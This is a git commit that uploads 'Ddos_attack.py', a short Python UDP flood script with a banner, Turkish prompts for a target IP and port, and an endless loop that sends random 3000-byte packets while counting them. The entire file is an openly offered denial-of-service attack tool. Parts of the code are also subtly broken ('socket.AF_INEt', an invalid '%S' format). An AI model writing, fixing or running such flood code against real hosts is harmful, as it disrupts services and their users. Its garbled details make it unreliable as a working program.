ce6d7fe069bec4acf6996385a5be455e6896dd87
smu67 <48688784+smu67@users.noreply.github.com>
2020-11-28 22:25:52 +0300

    Add files via upload

---
+++ Ddos_attack.py
@@ -0,0 +1,32 @@
+import socket
+import random
+import os
+
+
+os.system("clear")
+banner="""
+##########################
+#LionLion1905 Ddos V1.0  #
+#Code by Rei-ken         #
+##########################
+
+
+"""
+print(banner)
+
+ 
+hedef_ip=raw_input("hedef ip: ")
+hedef_port=input("hedef port: ")
+
+
+bytes=random._urandom(3000)
+sock=socket.socket(socket.AF_INEt,socket.SOCK_DGRAM)
+
+
+sayac=0
+while True:
+        sock.sendto(bytes,(hedef_ip,hedef_port))
+        sayac=sayac+1
+        print("saldiri baslatildi,gonderilen paket:%S"%(sayac))
+
+                 
